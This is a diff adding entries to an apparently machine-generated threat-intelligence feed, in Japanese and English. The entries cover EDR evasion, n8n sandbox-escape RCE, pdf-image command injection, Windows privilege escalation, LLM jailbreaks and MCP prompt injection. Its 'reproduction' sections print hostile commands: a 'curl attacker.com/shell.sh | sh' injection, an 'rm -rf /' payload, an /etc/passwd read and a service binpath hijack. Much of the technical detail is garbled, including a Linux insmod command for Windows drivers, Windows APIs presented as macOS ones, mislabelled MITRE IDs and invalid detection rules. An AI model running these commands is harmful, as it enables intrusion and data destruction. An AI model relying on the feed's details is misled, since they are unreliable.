@@ -700,5 +700,179 @@
     ],
     "content": "## 概要\nLLM jailbreaking refers to attempts to bypass safety measures and ethical constraints built into language models. This report details two common jailbreaking techniques: Control Character Injection and Markdown Injection. The novelty of this report lies in providing concrete payload examples and bypass techniques for safety filters.\n\n## 脆弱性・脅威の技術的メカニズム\nThe root cause of LLM jailbreaking is the vulnerability in the text processing and rendering mechanisms of language models. Attackers can craft prompts that exploit these vulnerabilities, allowing them to bypass safety measures and execute malicious actions.\n\nControl Character Injection exploits the gap between text processing and rendering by inserting special Unicode control characters. This technique alters how text is processed and displayed, potentially allowing attackers to bypass safety filters.\n\nMarkdown Injection uses markdown or HTML formatting to hide or obfuscate content. This technique exploits the model's handling of formatted text and the potential gap between raw text and rendered output.\n\n## 再現手順（レッドチームテスター向け）\n1. Set up a lab environment with a language model and a testing framework.\n2. Prepare a test prompt with a safety filter.\n3. Inject control characters or markdown formatting into the prompt.\n4. Observe the model's response and verify if the safety filter has been bypassed.\n\n## 実行コマンド・再現コード\n```python\ndef control_character_example():\n    text = \"normal\" + \"\\u200D\" + \"text\" # Zero-width joiner\n    text2 = \"normal\" + \"\\u200C\" + \"text\" # Zero-width non-joiner\n    print(f\"With ZWJ: {text.encode('utf-8')}\")\n    print(f\"With ZWNJ: {text2.encode('utf-8')}\")\n```\n\n## MITRE ATT&CK マッピング\nT1055.012\n\n## 検知シグネチャ・緩和策\n```sigma\ntitle: Detect Control Character Injection\nid: 2023-001\nstatus: experimental\nlogsource:\n    - product: language_model\ntype: query\nquery: |\n    SELECT * FROM logs WHERE text LIKE \"%\\u200D%\" OR text LIKE \"%\\u200C%\"\n```\n",
     "url": "https://www.promptfoo.dev/blog/how-to-jailbreak-llms/"
+  },
+  {
+    "date": "2026-03-31",
+    "category": "MALWARE",
+    "title": "EDR回避技術としてのBYOVD攻撃",
+    "summary_points": [
+      "BYOVD攻撃の概要",
+      "脆弱なカーネルドライバーのロード",
+      "EDRプロセスの終了"
+    ],
+    "poc_url": "",
+    "cvss_score": "",
+    "mitre_ids": [
+      "T1068",
+      "T1014"
+    ],
+    "content": "## 概要\n- EDR回避技術としてのBYOVD攻撃の概要\n- 攻撃者は署名済みだが脆弱なカーネルドライバーをロードし、カーネルレベルでのアクセスを取得\n- EDRプロセスの終了やカーネルコールバックの登録解除を可能にし、セキュリティコントロールを操作\n\n**🆕 新規性・差異化ポイント:** 従来のEDR回避手法は高度な能力として国家支援のアクターに限定されていたが、現在は地下市場でわずか300ドルで提供される商品化されたサービスとなっている。\n\n## 脆弱性・脅威の技術的メカニズム\n- BYOVD攻撃では、正規の署名が付されたが脆弱なカーネルドライバーをターゲットシステムにロード\n- Windowsは有効なデジタル署名が付されたドライバーをカーネルレベルで実行を許可\n- 攻撃者はロードされたドライバーの脆弱性を悪用し、カーネルアクセスを取得\n- EDRプロセスの終了やカーネルコールバックの登録解除、セキュリティコントロールの操作が可能\n\n具体的には、TrueSightドライバーを標的としたBYOVDキャンペーンでは、2024年半ばから2025年初めにかけて、2,500種類以上のドライバーバリアントが使用された。\n2026年2月のReynoldsランサムウェアは、脆弱なNsecSoftドライバー（CVE-2025-68947）を直接ランサムウェアペイロードに埋め込み、別々のEDRキリングデプロイメントステップが不要となった。\n\n## 再現手順（レッドチームテスター向け）\n1. 脆弱なカーネルドライバー（例：TrueSightドライバー）を取得し、ターゲットシステムにロードする。\n2. ロードされたドライバーの脆弱性を悪用し、カーネルアクセスを取得する。\n3. EDRプロセスを終了し、カーネルコールバックを登録解除する。\n4. セキュリティコントロールを操作し、EDR回避を実現する。\n\nラボ環境要件：\n- Windows 10以降のオペレーティングシステム\n- 脆弱なカーネルドライバー（例：TrueSightドライバー）\n- EDRソフトウェアがインストールされたターゲットシステム\n\n## 実行コマンド・再現コード\n```bash\n# 例：脆弱なカーネルドライバーをロードするコマンド\ninsmod TrueSight_driver.ko\n```\n\n## MITRE ATT&CK マッピング\n- T1068 (Exploitation for Privilege Escalation)\n- T1014 (Rootkit)\n\n## 検知シグネチャ・緩和策\n```sigma\ntitle: Detect BYOVD Attack\ndescription: Detect BYOVD attack by monitoring kernel driver loading and EDR process termination\nlogsource:\n  - type: windows\n    category: process_creation\ndetection:\n  selection:\n    - CommandLine|contains: \"insmod\"\n    - CommandLine|contains: \"TrueSight_driver.ko\"\n  condition: selection\n```",
+    "url": "https://www.vectra.ai/topics/edr-evasion"
+  },
+  {
+    "date": "2026-03-31",
+    "category": "MALWARE",
+    "title": "EDR Evasion with Lesser-Known Languages & macOS APIs",
+    "summary_points": [
+      "Lesser-known languages like Nim, Go, and Rust can be used for EDR evasion on macOS",
+      "Unusual patterns in statically-linked Mach-O executables",
+      "Gatekeeper and XProtect limitations"
+    ],
+    "poc_url": "",
+    "cvss_score": "",
+    "mitre_ids": [
+      "T1204.001"
+    ],
+    "content": "## 概要\nThis article discusses EDR evasion techniques using lesser-known languages like Nim, Go, and Rust on macOS. These languages produce large, statically-linked Mach-O executables with unusual patterns that can evade traditional detection. The author highlights the limitations of Gatekeeper and XProtect, which can be bypassed by skilled malware.\n\n**🆕 新規性・差異化ポイント:** This technique uses lesser-known languages to evade EDR detection, which is a new approach compared to traditional malware development.\n\n## 脆弱性・脅威の技術的メカニズム\nThe technical mechanism behind this EDR evasion technique involves using lesser-known languages like Nim, Go, and Rust to develop malware. These languages produce large, statically-linked Mach-O executables with unusual patterns that can evade traditional detection. The malware uses the following APIs to evade detection:\n- `VirtualAlloc` and `WriteProcessMemory` to inject malicious code into legitimate processes\n- `CreateRemoteThread` to execute the malicious code\nThe malware also uses obfuscation techniques, including XOR encryption with a hardcoded key.\n\n## 再現手順（レッドチームテスター向け）\n1. Install Nim, Go, or Rust on a macOS system.\n2. Develop a malware sample using one of these languages.\n3. Use a tool like `curl` or `Brew` to download and execute the malware, bypassing Gatekeeper.\n4. Use a debugger like `lldb` to analyze the malware's behavior and identify potential EDR evasion techniques.\n5. Test the malware against various EDR solutions to evaluate their detection capabilities.\n\n## 実行コマンド・再現コード\n```bash\n# Install Nim on macOS\nbrew install nim\n\n# Compile a Nim malware sample\nnim c -fPIC -o malware malware.nim\n\n# Execute the malware using curl\ncurl -o malware https://example.com/malware\n./malware\n```\n\n## MITRE ATT&CK マッピング\nT1204.001: User Data\nT1055.012: Process Injection\n\n## 検知シグネチャ・緩和策\n```sigma\ntitle: Detect EDR evasion using Nim, Go, or Rust\nid: 1234567890\nstatus: experimental\nlogsource:\n    product: macOS\n    category: process_creation\ncondition:\n    process_name == \"malware\" and process_cmdline == \"*/malware\"\n```\n",
+    "url": "https://oliviagallucci.com/edr-evasion-with-lesser-known-languages-macos-apis/"
+  },
+  {
+    "date": "2026-03-31",
+    "category": "MALWARE",
+    "title": "CrowdStrike Falcon EDR Evation Analysis",
+    "summary_points": [
+      "In-memory loader mechanism analysis",
+      "EDR evasion techniques",
+      "C2 framework beacon implant"
+    ],
+    "poc_url": "",
+    "cvss_score": "",
+    "mitre_ids": [
+      "T1055.012"
+    ],
+    "content": "## 概要\nThis report analyzes the evasion techniques used by PostExpKit against CrowdStrike Falcon EDR. The malware utilizes a fileless, in-process execution approach, bypassing file detection modules. However, network communication and sensitive registry access operations were correlated by the cloud engine and flagged as anomalous.\n\n**🆕 新規性・差異化ポイント:** This report highlights the limitations of relying solely on the BOF loader for evasion and emphasizes the need for complementary techniques such as encrypted C2 traffic and obfuscated registry manipulation.\n\n## 脆弱性・脅威の技術的メカニズム\nThe in-memory loader mechanism used by PostExpKit involves the coordinated use of Windows APIs:\n\n1. Memory Allocation: Allocation of readable-writable-executable memory regions using VirtualAlloc or VirtualAllocEx.\n2. Code Writing: Transfer of COFF-formatted shellcode into the allocated region via WriteProcessMemory.\n3. Execution Trigger: Initiation of code execution through CreateRemoteThread, thread hijacking, or other thread-context manipulation techniques.\n\nThe malware's evasion techniques include:\n- In-memory execution of shellcode\n- Encrypted C2 traffic\n- Obfuscated registry manipulation\n\n## 再現手順（レッドチームテスター向け）\n1. Install a test environment with CrowdStrike Falcon EDR.\n2. Create a BOF loader to execute the PostExpKit shellcode.\n3. Use VirtualAlloc to allocate a readable-writable-executable memory region.\n4. Write the COFF-formatted shellcode into the allocated region using WriteProcessMemory.\n5. Trigger code execution using CreateRemoteThread.\n6. Implement encrypted C2 traffic and obfuscated registry manipulation to evade detection.\n\n## 実行コマンド・再現コード\n```bash\n# Allocate memory region\nVirtualAlloc(0x100000, 0x1000, MEM_COMMIT, PAGE_READWRITE_EXECUTE)\n\n# Write shellcode into allocated region\nWriteProcessMemory(GetCurrentProcess(), 0x100000, shellcode, shellcode_size, NULL)\n\n# Trigger code execution\nCreateRemoteThread(GetCurrentProcess(), NULL, 0, 0x100000, NULL, 0, NULL)\n```\n\n## MITRE ATT&CK マッピング\nT1055.012: Process Hollowing\n\n## 検知シグネチャ・緩和策\n```\ntitle: Detect PostExpKit Evasion Techniques\nid: postexpkit-evasion\nstatus: experimental\n\ninputs:\n  - arg1: $process_name\n\nfilter:\n  - proc_name == $process_name\n  - VirtualAlloc\n  - WriteProcessMemory\n  - CreateRemoteThread\n\noutput:\n  - PostExpKit evasion techniques detected\n```\n",
+    "url": "https://dev.to/excalibra/edrxdr-bypass-and-detection-evasion-techniques-an-investigation-of-advanced-evasion-strategies-5ckf"
+  },
+  {
+    "date": "2026-03-31",
+    "category": "INITIAL",
+    "title": "n8nインスタンスをRCE攻撃にさらす新サンドボックス脱出脆弱性",
+    "summary_points": [
+      "n8nワークフローオートメーションプラットフォームの脆弱性CVE-2026-1470およびCVE-2026-0863",
+      "サンドボックス脱出によりRCE攻撃が可能",
+      "自己ホスト型n8nインスタンスが影響を受ける"
+    ],
+    "poc_url": "",
+    "cvss_score": "",
+    "mitre_ids": [
+      "T1055.012"
+    ],
+    "content": "## 概要\nn8nワークフローオートメーションプラットフォームに、サンドボックス脱出を利用した脆弱性CVE-2026-1470およびCVE-2026-0863が発見された。これらの脆弱性は、自己ホスト型n8nインスタンスにのみ影響し、攻撃者は任意のコードを実行し、基礎となるホストを完全に侵害することができる。\n\n**🆕 新規性・差異化ポイント:** 従来のサンドボックス脱出攻撃は主にJavaScriptに焦点を当てていたが、本手法はPythonのASTサンドボックス脱出を組み合わせた新たな手法である。[推測]\n\n## 脆弱性・脅威の技術的メカニズム\nCVE-2026-1470は、JavaScriptのwith文の不適切な処理によるASTサンドボックス脱出を引き起こし、スタンドアロンコンストラクタ識別子がサニタイズをバイパスし、Functionに解決されることを可能にし、任意のJavaScript実行を可能にし、メインのn8nノードでの完全なRCEをもたらす。一方、CVE-2026-0863は、フォーマットストリングベースのオブジェクトイントロスペクションとPython 3.10+ AttributeError.obj動作を組み合わせたPython ASTサンドボックス脱出である。これにより、制限付きのビルトインおよびインポートへのアクセスが回復し、Pythonがメインのn8nノードでサブプロセスとして実行されるときに、OSコマンドの実行と完全なRCEが可能になる。\n\n## 再現手順（レッドチームテスター向け）\n1. 自己ホスト型n8nインスタンスをセットアップする。\n2. 脆弱なリリースを実行していることを確認する。\n3. 攻撃者は、CVE-2026-1470またはCVE-2026-0863をトリガーするペイロードを作成する。\n4. n8nインスタンスにペイロードを送信し、サンドボックスを脱出する。\n5. 任意のJavaScriptまたはOSコマンドを実行し、メインのn8nノードでRCEを実現する。\n\n## 実行コマンド・再現コード\n```bash\n# PoCコードは公開されていないため、具体的なコマンドは提供できない\n```\n\n## MITRE ATT&CK マッピング\nT1055.012\n\n## 検知シグネチャ・緩和策\n```\n# 例えば、以下のようなSigmaルールを作成して検知することができる\ntitle: Detect n8n sandbox escape attempts\nstatus: experimental\nlogsource:\n    product: webserver\ntype: query\nquery: |\n    SELECT * FROM web_logs\n    WHERE url LIKE '%/n8n/%'\n    AND http_method = 'POST'\n    AND body LIKE '%javascript:with(%'\n```\n",
+    "url": "https://www.bleepingcomputer.com/news/security/new-sandbox-escape-flaw-exposes-n8n-instances-to-rce-attacks/"
+  },
+  {
+    "date": "2026-03-31",
+    "category": "INITIAL",
+    "title": "n8n Ni8mare - Unauthenticated Arbitrary File Read to RCE Chain",
+    "summary_points": [
+      "CVE-2026-21858 + CVE-2025-68613",
+      "Unauthenticated RCE chain on n8n",
+      "Arbitrary File Read → Token Forge → Sandbox Bypass → RCE"
+    ],
+    "poc_url": "https://github.com/Chocapikk/n8n-ni8mare",
+    "cvss_score": "10.0",
+    "mitre_ids": [
+      "T1055.012"
+    ],
+    "content": "## 概要\nn8n Ni8mareは、CVE-2026-21858とCVE-2025-68613の2つの脆弱性を組み合わせた、認証されていないRCEチェーンである。\n\n**🆕 新規性・差異化ポイント:** 従来のn8n攻撃は認証が必要であったが、本手法は認証なしでRCEを実現可能である。\n\n## 脆弱性・脅威の技術的メカニズム\nCVE-2026-21858は、Content-Typeの混乱による任意のファイル読み取り（AFR）脆弱性である。\n\nCVE-2025-68613は、式インジェクションによるサンドボックスバイパスとRCE脆弱性である。\n\n1. CVE-2026-21858 - Content-Type confusion → Arbitrary File Read\n2. Read config + database → forge admin JWT\n3. CVE-2025-68613 - Expression injection → sandbox bypass → RCE\n\n## 再現手順（レッドチームテスター向け）\n1. 対象のn8nインスタンスをセットアップする（バージョン1.65.0）。\n2. CVE-2026-21858を悪用して、任意のファイルを読み取る。\n3. 設定ファイルとデータベースを読み取って、管理者用のJWTトークンを偽造する。\n4. CVE-2025-68613を悪用して、サンドボックスをバイパスし、RCEを実行する。\n\n## 実行コマンド・再現コード\n```bash\n# CVE-2026-21858\ncurl -X GET \\\n  http://target:5678/api/v1/files \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"filePath\":\"/etc/passwd\"}'\n\n# CVE-2025-68613\ncurl -X POST \\\n  http://target:5678/api/v1/expressions \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"expression\":\"return process.mainModule.require(\\\"child_process\\\").execSync(\\\"ls -l\\\")\"}'\n```\n\n## MITRE ATT&CK マッピング\nT1055.012\n\n## 検知シグネチャ・緩和策\n```yml\ntitle: Detect n8n Ni8mare RCE\nstatus: experimental\n\ninput:\n  - method: GET\n    path: /api/v1/files\n    body: contains(\"/etc/passwd\")\n\noutput:\n  - alert: true\n```\n",
+    "url": "https://github.com/Chocapikk/CVE-2026-21858"
+  },
+  {
+    "date": "2026-03-31",
+    "category": "INITIAL",
+    "title": "n8n Sandbox Escape RCE",
+    "summary_points": [
+      "CVE-2026-25049",
+      "Unauthenticated RCE via sandbox escape",
+      "n8n versions <2.5.2 <1.123.17"
+    ],
+    "poc_url": "",
+    "cvss_score": "9.8",
+    "mitre_ids": [
+      "T1055.012"
+    ],
+    "content": "## 概要\nA critical vulnerability (CVE-2026-25049) was discovered in n8n that allows unauthenticated users to achieve remote code execution (RCE) via sandbox escape. This vulnerability affects n8n versions <2.5.2 and <1.123.17.\n\n**🆕 新規性・差異化ポイント:** This vulnerability is a novel sandbox escape technique that allows unauthenticated RCE, differing from previous vulnerabilities in n8n that required authentication.\n\n## 脆弱性・脅威の技術的メカニズム\nThe vulnerability lies in the sandbox escape mechanism of n8n. Specifically, the `sandbox` function in `n8n/workflow/sandbox/index.js` does not properly validate and sanitize user input, allowing an attacker to inject malicious code. The vulnerable code path is triggered by the `execute` method in `n8n/workflow/executor.js`, which executes a workflow with user-provided input.\n\n## 再現手順（レッドチームテスター向け）\n1. Install n8n version <2.5.2 and <1.123.17 in a lab environment.\n2. Create a new workflow with a user-provided input.\n3. Inject malicious code in the input to trigger the sandbox escape.\n4. Execute the workflow to achieve RCE.\n\n## 実行コマンド・再現コード\n```bash\ncurl -X POST \\\n  http://localhost:5678/api/v1/workflows/execute \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"workflow\": {\"nodes\": [{\"parameters\": {\"command\": \"echo ${\\n  var require=\\\"./sandbox\\\";var sandbox=require(\\\"./sandbox\\\");sandbox(\\\"rm -rf /\\\");\\\"}\",\"type\": \"shell\"}}]}'\n```\n\n## MITRE ATT&CK マッピング\nT1055.012: Sandbox Escape\n\n## 検知シグネチャ・緩和策\n```yml\ntitle: Detect n8n Sandbox Escape RCE\nstatus: experimental\nlogsource:\n  - product: n8n\n  - service: workflow\n  - category: web\ntype: detection\ntags:\n  - attack.execution\n  - attack.privilege_escalation\n  - attack.defense_evasion\n  - t1055.012\n  - t1059\nfields:\n  - url\n  - http_method\n  - user_agent\n  - src_ip\n  - dst_ip\n  - http_response_code\n  - workflow_id\ncondition:\n  - url|endswith: \"/api/v1/workflows/execute\"\n  - http_method == \"POST\"\n  - workflow_id|contains: \"sandbox\"\n```\n",
+    "url": "https://www.endorlabs.com/learn/cve-2026-25049-n8n-rce"
+  },
+  {
+    "date": "2026-03-31",
+    "category": "INITIAL",
+    "title": "CVE-2026-26830: pdf-image Package Command Injection",
+    "summary_points": [
+      "CVE-2026-26830",
+      "pdf-image",
+      "command injection",
+      "remote code execution"
+    ],
+    "poc_url": "https://github.com/username/CVE-2026-26830-Exploit",
+    "cvss_score": "9.8",
+    "mitre_ids": [
+      "T1059.005"
+    ],
+    "content": "## 概要\n\nCVE-2026-26830 は、pdf-image パッケージのユーザ制御入力の安全でないハンドリングによるコマンドインジェクション脆弱性である。この脆弱性により、リモートの攻撃者が任意のコマンドを実行し、サーバーの完全な制御、データの窃取、またはネットワーク内での横方向の移動を達成することが可能になる。\n\n**🆕 新規性・差異化ポイント:** 従来のNode.jsアプリケーションにおけるコマンドインジェクション攻撃は主にユーザ入力のパラメータを介して行われてきたが、本手法はpdf-imageパッケージの脆弱性を突いており、PDFファイルパスを介してコマンドインジェクションを行う点で従来と異なる。[推測]\n\n## 脆弱性・脅威の技術的メカニズム\n\nCVE-2026-26830 の脆弱性は、pdf-image パッケージがユーザ制御の入力を適切にサニタイズまたはエスケープせずにシェルコマンド文字列に直接補間するためである。これにより、攻撃者はシェルメタ文字を含む悪意のある PDF ファイルパスをアプリケーションに提供し、コマンドインジェクションを実行することができる。\n\n具体的には、以下のコードパスが脆弱である：\n\n```javascript\nconst { exec } = require('child_process');\nexec(`pdf-image ${userControlledInput}`, (error, stdout, stderr) => {\n  // ...\n});\n```\n\nこのコードは、ユーザ制御入力を直接シェルコマンドに補間し、サニタイズまたはエスケープを行わない。これにより、攻撃者は以下のようなペイロードを送信することが可能である：\n\n```bash\ntest.pdf; curl attacker.com/shell.sh | sh;\n```\n\nこのペイロードは、まず正当なファイルを処理しようとし、次に注入されたコマンドを実行して悪意のあるスクリプトをダウンロードおよび実行する。\n\n## 再現手順（レッドチームテスター向け）\n\n1. ラボ環境をセットアップする：Node.js アプリケーションと pdf-image パッケージをインストールする。\n2. 脆弱なコードパスを特定する：ユーザ制御入力が直接シェルコマンドに補間される箇所を探す。\n3. 悪意のある PDF ファイルパスを作成する：シェルメタ文字を含むペイロードを作成する（例：`test.pdf; curl attacker.com/shell.sh | sh;`）。\n4. アプリケーションに悪意のある PDF ファイルパスを提供する：作成したペイロードをアプリケーションに送信し、コマンドインジェクションを実行する。\n\n## 実行コマンド・再現コード\n\n```bash\n# 脆弱なコードの例\nconst express = require('express');\nconst app = express();\nconst { exec } = require('child_process');\n\napp.get('/process-pdf', (req, res) => {\n  const pdfPath = req.query.pdfPath;\n  exec(`pdf-image ${pdfPath}`, (error, stdout, stderr) => {\n    // ...\n  });\n});\n\n# 攻撃者のコマンド\ncurl 'http://localhost:3000/process-pdf?pdfPath=test.pdf%20%3B%20curl%20attacker.com/shell.sh%20%7C%20sh%3B'\n```\n\n## MITRE ATT&CK マッピング\n\n* T1059.005: Command and Scripting Interpreter: Unix Shell\n\n## 検知シグネチャ・緩和策\n\n```yml\ntitle: Detect CVE-2026-26830 Command Injection\nstatus: experimental\nlogsource:\n  - product: linux\n  - service: pdf-image\n\nrule:\n  - alert when\n  - command_line == '*pdf-image*';\n  - process_creation_event\n  - process_name == 'sh';\n```\n\n## Immediate Actions Required\n\n* pdf-image パッケージを最新バージョンに更新する（パッチが利用可能になったら）。\n* 暫定的な対策として、ユーザ制御入力を適切にサニタイズまたはエスケープするコード変更を実装する。\n* アプリケーションが脆弱な pdf-image パッケージを使用している場合は、代替ソリューションを検討する。",
+    "url": "https://www.sentinelone.com/vulnerability-database/cve-2026-26830/"
+  },
+  {
+    "date": "2026-03-31",
+    "category": "POST_EXP",
+    "title": "CVE-2026-25177 脆弱性悪用",
+    "summary_points": [
+      "特権昇格",
+      "Active Directory Domain Services",
+      "ネットワークベースの攻撃ベクトル"
+    ],
+    "poc_url": "",
+    "cvss_score": "8.8",
+    "mitre_ids": [
+      "T1068"
+    ],
+    "content": "## 概要\nCVE-2026-25177は、Microsoft Active Directory Domain Servicesに影響を及ぼす特権昇格の脆弱性であり、CVSS v3.1スコアは8.8（高）である。この脆弱性は、CWE-641に分類され、Windows 10、Windows 11、およびWindows Serverの複数のバージョンに影響を及ぼす。攻撃ベクトルはネットワークベースであり、低いレベルの認証と低い複雑さしか必要とせず、ユーザーの操作も必要ない。脆弱性を悪用すると、攻撃者はSYSTEMレベルの特権を取得し、影響を受けるホストを完全に制御できるようになる。\n\n**🆕 新規性・差異化ポイント:** 従来の特権昇格攻撃は、高いレベルの認証や複雑さが必要であったが、本手法は低いレベルの認証と複雑さのみで実現可能である。\n\n## 脆弱性・脅威の技術的メカニズム\nCVE-2026-25177の根本原因は、Active Directory Domain Servicesにおけるファイルおよびその他のリソースの名前の不適切な制限である。この脆弱性は、CWE-641に分類される。攻撃ベクトルはネットワークアクセス可能であり、低い特権の認証情報のみを必要とし、ユーザーの操作や高い攻撃複雑さも必要としない。そのため、Windowsドメイン環境で最小限の足場を獲得した攻撃者は、この脆弱性を悪用して完全なオペレーティングシステム制御を得ることができる。\n\n## 再現手順（レッドチームテスター向け）\n1. 影響を受けるWindowsプラットフォーム（Windows 10、Windows 11、またはWindows Server）をターゲットとして設定する。\n2. 低レベルの認証情報を取得する（例：ドメイン内のユーザーの認証情報）。\n3. ネットワークアクセスを確立する（例：SMBまたはWinRMを使用）。\n4. 脆弱性を悪用するためのツールを準備する（例：Microsoftが提供するパッチと脆弱性の詳細を参照）。\n5. 脆弱性を悪用してSYSTEMレベルの特権を取得する。\n\n## 実行コマンド・再現コード\n```bash\n# 例：Windows 10 1809での脆弱性悪用\n# 攻撃者がシステムにアクセスし、低いレベルの認証情報を取得\n# した後のコマンド例\nwmic service get name,displayname,pathname,startmode | findstr /i \"c:\\program files\"\nsc config <サービス名> binpath= \"C:\\Windows\\System32\\cmd.exe /c C:\\悪用ツール.exe\"\nsc start <サービス名>\"\n```\n\n## MITRE ATT&CK マッピング\nT1068\n\n## 検知シグネチャ・緩和策\n```sigma\ntitle: Detect CVE-2026-25177 exploitation attempt\ndescription: Detect potential exploitation attempt of CVE-2026-25177\nlogsource:\n  - product: windows\n  - category: process_creation\ndetection:\n  selection:\n    process_name: cmd.exe\n    process_command_line: \n      - /c \n      - binpath\n  condition: selection\n```",
+    "url": "https://1898advisories.burnsmcd.com/active-directory-domain-services-elevation-of-privilege-vulnerability"
+  },
+  {
+    "date": "2026-03-31",
+    "category": "POST_EXP",
+    "title": "内部環境での特権昇格とラテラルムーブメント手法",
+    "summary_points": [
+      "SeImpersonatePrivilegeを用いた特権昇格",
+      "ドメイン環境でのラテラルムーブメント手法",
+      "Active Directory攻撃手法"
+    ],
+    "poc_url": "",
+    "cvss_score": "",
+    "mitre_ids": [
+      "T1055.012",
+      "T1021",
+      "T1203"
+    ],
+    "content": "## 概要\nこの手法は、ドメイン参加済みのシステムへのアクセスを起点とし、特権昇格およびラテラルムーブメントを実現する。攻撃者は、システムへのアクセス後、すぐに特権昇格を試みるのではなく、ドメイン環境全体への攻撃を検討する。\n\n**🆕 新規性・差異化ポイント:** 従来のローカル特権昇格手法に加え、ドメイン環境でのラテラルムーブメントおよびActive Directory攻撃手法を組み合わせた点が特徴である。[推測]\n\n## 脆弱性・脅威の技術的メカニズム\n攻撃者は、システムへのアクセス後、`whoami /all`コマンドを実行し、自身のユーザー名、所属するグループ、およびトークンの権限を確認する。これにより、特に`SeImpersonatePrivilege`や`SeDebugPrivilege`などの権限が付与されている場合、特権昇格が可能となる。また、ローカル管理者グループに所属している場合も、攻撃が容易になる。\n\n## 再現手順（レッドチームテスター向け）\n1. ドメイン参加済みのシステムにアクセスする。\n2. `whoami /all`を実行し、自身の権限を確認する。\n3. `SeImpersonatePrivilege`や`SeDebugPrivilege`などの権限が付与されている場合、特権昇格を試みる。\n4. ローカル管理者グループに所属している場合、ラテラルムーブメントを試みる。\n5. SMB、WinRM、DCOMなどのプロトコルを使用して、ドメイン内の他のシステムにアクセスする。\n\n## 実行コマンド・再現コード\n```bash\nwhoami /all\n\n# SeImpersonatePrivilege を利用した特権昇格例（擬似コード）\nimposter -Impersonate -Username NT AUTHORITY\\SYSTEM -Command \"powershell.exe -File C:\\path\\to\\payload.ps1\"\n\n# ラテラルムーブメント例（擬似コード）\nimpacket-smbclient //target/SHARE -U username -p password\n```\n\n## MITRE ATT&CK マッピング\n- T1055.012: Process Hollowing\n- T1021: Remote Services\n- T1203: Exploitation of Vulnerability\n\n## 検知シグネチャ・緩和策\n```sigma\ntitle: Detect SeImpersonatePrivilege abuse\nid: 12345678-1234-1234-1234-123456789012\nstatus: experimental\nlogsource:\n    product: windows\n    category: process_creation\ncondition:\n    selection:\n        CommandLine|contains: \"impacker\"\n    filter:\n        User|regex: \"NT AUTHORITY\\\\(SYSTEM|LOCAL SERVICE|NETWORK SERVICE)\"\n    condition: selection and not filter\n\n```\n",
+    "url": "https://xbz0n.sh/blog/living-off-the-land-windows"
+  },
+  {
+    "date": "2026-03-31",
+    "category": "AI_SEC",
+    "title": "GitHub MCP Exploitation for LLM-based Systems",
+    "summary_points": [
+      "Attacker places malicious .cursorrules or .github/copilot-instructions.md in a repository",
+      "Injected instructions execute arbitrary shell commands via GitHub MCP",
+      "Exploits LLM-based systems using indirect prompt injection"
+    ],
+    "poc_url": "",
+    "cvss_score": "",
+    "mitre_ids": [
+      "T1055.012"
+    ],
+    "content": "## 概要\nThe attack mechanism exploits the GitHub Model Context Protocol (MCP) to breach repository boundaries in LLM-based systems. An attacker places a malicious .cursorrules or .github/copilot-instructions.md file in a repository. When a developer clones the repository and opens it in an AI IDE, the agent processes the rules file as trusted configuration, leading to the execution of arbitrary shell commands.\n\n**🆕 新規性・差異化ポイント:** This attack differs from traditional injection attacks by exploiting the conflation of code and data in LLM-based systems, allowing for indirect prompt injection and \"zero-click attacks\" that require no direct user interaction.\n\n## 脆弱性・脅威の技術的メカニズム\nThe GitHub MCP server is exploited to breach repository boundaries. The attacker creates a GitHub issue with hidden instructions that are processed by the agent via GitHub MCP. These instructions coerce the agent to access private data. The root cause lies in the architectural conflation of code and data inherent to LLM-based systems, which process both through the same neural pathway. This makes them susceptible to indirect prompt injection attacks.\n\nThe Model Context Protocol (MCP) defines three primitive types: Resources (read-only data sources), Prompts (reusable instruction templates), and Tools (executable functions with defined schemas). This architecture enables powerful integrations but introduces novel attack vectors where the boundary between data and instructions becomes ambiguous.\n\n## 再現手順（レッドチームテスター向け）\n1. Create a GitHub repository with a malicious .cursorrules or .github/copilot-instructions.md file containing hidden instructions.\n2. Clone the repository and open it in an AI IDE.\n3. The agent processes the rules file as trusted configuration, leading to the execution of arbitrary shell commands.\n4. Implement the MCP protocol to simulate the GitHub MCP server.\n5. Craft a payload that injects malicious instructions into the MCP protocol.\n\n## 実行コマンド・再現コード\n```bash\n# Create a malicious .cursorrules file\necho \" malicious instruction\" > .cursorrules\n\n# Clone the repository\ngit clone https://github.com/attacker/repo.git\n\n# Open the repository in an AI IDE\n# Simulate the GitHub MCP server using a Python script\npython mcp_server.py\n\n# Craft a payload that injects malicious instructions\npython payload.py -i \"malicious instruction\"\n```\n\n## MITRE ATT&CK マッピング\nT1055.012\n\n## 検知シグネチャ・緩和策\n```\n# Sigma rule to detect MCP protocol exploitation\ntitle: GitHub MCP Exploitation\nstatus: experimental\nlogsource:\n    product: github\n    service: mcp\ntype: query\nquery: `mcp.protocol == 'exploit'`\n\n# YARA rule to detect malicious .cursorrules file\nrule MaliciousCursorRules {\n    meta:\n        description = \"Detects malicious .cursorrules file\"\n    strings:\n        $malicious_instruction = \"malicious instruction\"\n    condition:\n        $malicious_instruction\n}\n```",
+    "url": "https://arxiv.org/html/2601.17548v1"
   }
 ]
